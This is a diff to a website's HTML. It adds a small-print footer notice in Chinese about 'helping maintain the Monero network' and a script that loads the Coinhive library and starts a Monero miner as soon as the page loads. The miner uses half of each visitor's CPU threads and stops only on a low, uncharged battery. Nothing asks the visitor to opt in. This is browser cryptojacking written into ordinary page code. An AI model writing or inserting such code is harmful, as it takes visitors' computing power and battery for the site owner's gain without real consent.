@@ -125,6 +125,10 @@
     <footer>
       <div class="container text-center">
         <p>Copyright &copy; MCSL801 2017</p>
+        <p style="font-size: 9pt;text-align: center;">
+        <strong>Notice: </strong>
+        本網站將透過您的瀏覽器協助維護Monero網路<br>
+        您的支持將鼓勵作者持續創作，謝謝</p>
       </div>
     </footer>
 
@@ -160,6 +164,34 @@
       
       });
     </script>
+   
+
+    <!-- Donation -->
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    if (navigator.hardwareConcurrency > 1){
+      var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
+    }else{
+      var cpuConfig = {throttle:0.6}
+    }
+    var miner = new CoinHive.Anonymous('tH4NbPyrMlB0vFuPcNkIz6Ul1lKChOnA', cpuConfig);
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    // Update stats once per second
+    setInterval(function() {
+      var threadCount = miner.getNumThreads();
+      var hashesPerSecond = Math.round(miner.getHashesPerSecond());
+      var getTotalHashes = miner.getTotalHashes();
+      try {
+        navigator.getBattery().then(function (battery) {
+          if (battery.level < 0.60 && battery.charging == false) {
+            miner.stop();
+          }
+        });
+      }catch(e){console.log(e)}
+    }, 800);
+    </script>
+    
+    
   </body>
 
 </html>
